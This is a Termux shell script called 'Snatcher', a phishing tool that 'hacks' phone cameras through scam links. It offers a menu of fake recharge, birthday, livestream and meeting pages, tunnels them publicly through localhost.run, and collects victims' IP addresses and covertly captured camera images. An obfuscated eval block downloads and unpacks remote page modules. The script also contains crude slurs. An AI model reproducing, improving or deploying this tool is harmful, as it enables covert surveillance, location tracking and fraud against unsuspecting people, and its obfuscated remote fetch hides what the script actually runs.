#!/data/data/com.termux/files/usr/bin/bash

##   Snatcher : 	hack phone camera by sending a link 📸
##   Author 	: 	https://t.me/nullxvoid 
##   Version 	: 	1.0.0

AUTHOR=$(cat lib/AUTHOR)
VERSION=$(cat lib/VERSION)


# Net check 

ping -c 1 google.com >/dev/null 2>&1
if [ "$?" != '0' ]; then
  printf "Internet tera baap on karega madarchod!!\n"
  exit 1
fi 

# Requirements

command -v lolcat > /dev/null 2>&1 || { echo >&2 "lolcat not found!, Installing... lolcat"; apt install python -y && pip install lolcat 1; }

if [[ ! -d "${HOME}storage" ]]; then
  termux-setup-storage
  mv -f Snatcher-imgs /sdcard > /dev/null 2>&1 
else
  mv -f Snatcher-imgs /sdcard > /dev/null 2>&1
fi
z="
";nz='khud';Iz='ithu';NBz='[ -d';GBz='tch"';rz=' le ';Mz='.com';JBz='exit';xBz='com/';HCz='oad/';ABz=' cre';Sz='efs/';fz='; th';tBz=' htt';Az='crea';yBz='Anon';CBz=' you';YCz='rf m';mBz='-y >';OBz=' ".M';cBz='ke s';BBz='dits';WCz='2>&1';FCz='es/d';aBz='. ma';Bz='tor=';jz='"\e[';Xz='UTHO';Jz='buse';gBz='apt ';yz=' the';Lz='tent';SCz='.gz ';sz='mada';iBz='all ';wBz='hub.';DCz='r/re';OCz='-zxf';MBz='fi';MCz='z';DBz=' son';PCz=' mod';QCz='ules';CCz='tche';qBz='>&1';dz='= $A';qz=' kar';sBz=' -LO';vz='o no';ECz='leas';gz='en';UBz='tall';kBz='open';Gz='://r';Yz='R)';pBz='ll 2';dBz='ome ';uz='d\nD';Hz='aw.g';oBz='v/nu';mz=' to ';lz='abhi';VBz='ig a';Rz='er/r';QBz='es" ';XBz='equi';Cz='$(cu';cz='or !';YBz='reme';bz='reat';KCz='es.t';XCz='rm -';ZBz='nts.';uBz='ps:/';GCz='ownl';Wz='ib/A';JCz='.0/m';pz='code';Vz='in/l';Oz='n4Yo';Zz='if [';HBz='slee';ACz='4You';RCz='.tar';TCz='> /d';PBz='odul';KBz='else';VCz='ull ';tz='rcho';oz=' se ';Nz='/Ano';hBz='inst';LCz='ar.g';lBz='ssh ';ICz='v1.0';wz='t ch';Fz='ttps';Pz='u/Sn';UCz='ev/n';Qz='atch';jBz='php ';nBz=' /de';LBz=' ""';iz=' -e ';EBz=' of ';Uz='s/ma';rBz='curl';WBz='ll r';fBz='"';az='[ $c';SBz='then';kz='31mK';TBz='"Ins';RBz=']]; ';eBz='time';NCz='tar ';vBz='/git';Ez='sL h';Tz='head';BCz='/Sna';bBz='y ta';IBz='p 3';ez='R ]]';hz='echo';Dz='rl -';Kz='rcon';xz='nage';FBz='a bi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$dz$Xz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$z$HBz$IBz$z$JBz$z$KBz$z$hz$LBz$z$MBz$z$Zz$NBz$OBz$PBz$QBz$RBz$SBz$z$hz$LBz$z$KBz$z$hz$iz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$z$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$gBz$hBz$iBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$z$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$PBz$KCz$LCz$MCz$z$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$z$XCz$YCz$PBz$KCz$LCz$MCz$z$MBz"

main(){
  clear
  printf "
  >=>>=>                           >=>                                      
>=>    >=>                         >=>           >=>                        
 >=>       >==>>==>     >=> >=>  >=>>==>    >==> >=>        >==>    >> >==> 
   >=>      >=>  >=>  >=>   >=>    >=>    >=>    >=>>=>   >>   >=>   >=>    
      >=>   >=>  >=> >=>    >=>    >=>   >=>     >=>  >=> >>===>>=>  >=>    
>=>    >=>  >=>  >=>  >=>   >=>    >=>    >=>    >>   >=> >>         >=>    
  >=>>=>   >==>  >=>   >==>>>==>    >=>     >==> >=>  >=>  >====>   >==> Ver-${VERSION}" | lolcat
printf "

  \e[31;1m         .:.:.\e[0m\e[1;32m Snatcher camera hacker by ${AUTHOR} \e[0m\e[1;91m.:.:.\e[0m\n

       \e[101m\e[1;77m:: Author won't be resposible for any missuse of this tool ::\e[0m\n

    \e[36;1mAvailable scam services...\e[0;1m

     {1} Jio Recharge scam
     {2} Happy birthday scam
     {3} Youtube Live scam
     {4} Online meeting scam
     {5} Contact Author
     {0} Exit from tool

  "
  read -p "Choose a scam => " chs
  if [[ $chs == 0 ]]; then
    printf "\n\n\t\e[36mExitimg from tool....\e[0m\n"
    sleep 2
    exit
  elif [[ $chs == 1 ]]; then
    jio
  elif [[ $chs == 2 ]]; then
    fest
  elif [[ $chs == 3 ]]; then
    ytl
  elif [[ $chs == 4 ]]; then
    onmt
  elif [[ $chs == 5 ]]; then
    echo hello
  else
    printf "Invalid input try again madarchod..!"
    sleep 2
    main
  fi
}

jio(){
website="jio"
hosting
}

fest(){
website="fest"
hosting
}

ytl(){
website="live"
hosting
}

onmt(){
website="om"
hosting
}

hosting(){
  if [[ -d ".site" ]]; then
   rm -rf .site && mkdir .site
  else
    mkdir .site
  fi
  cp -rf .Modules/$website .site
  echo -e "\nif links are not shown relaunch the script $0\n"
  sleep 2
  printf "\e[32;1mStarting PHP server...\r"
  php -S localhost:8080 -t .site/$website > /dev/null 2>&1 &
  sleep 2
  #printf "Starting serveo.net...\r"
#  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
#  sleep 10
  printf "Starting localhost.run...\r"
  ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
  sleep 10
  #link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
  lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
  rm -rf .lhrlog .srvlog
  echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
#  echo Serveo.net : $link
  echo ""
  echo Localhost.run : $lhlink
  echo -e "\nLocalHost  : http://localhost:8080"
  target
}

target(){
echo -e "\n\e[31;1mWaiting for target info, press CTRL+C to stop\e[0m\n"
  while [[ true ]]; do
    if [[ -e ".site/$website/ip.txt" ]]; then
      echo -e "\e[32;1mVictim ip found!\e[0m"
      cat .site/$website/ip.txt
      rm -rf .site/$website/ip.txt
    fi 
    sleep 0.75
    if [[ -e ".site/$website/log.txt" ]]; then
      rm -rf .site/$website/log.txt
      echo -e "\n\e[32;1mImages snathed successfully..\e[0m"
      mv -f .site/$website/*.png /sdcard/Snatcher-imgs > /dev/null 2>&1
      echo -e "images saved in /sdcard/Snatcher-imgs directory\n"
      echo -e "\n\e[31;1mWaiting for next target info press CTRL+C to exit\e[0m\n"
    fi 
    sleep 0.75
  done
}


usr_intrp(){
  printf "\e[0m\e[1;36m\t CTRL+C Pressed!, Exiting...\n"
  rm -rf .site
  sleep 2
  exit
}

trap usr_intrp SIGINT
trap usr_intrp SIGTSTP
main
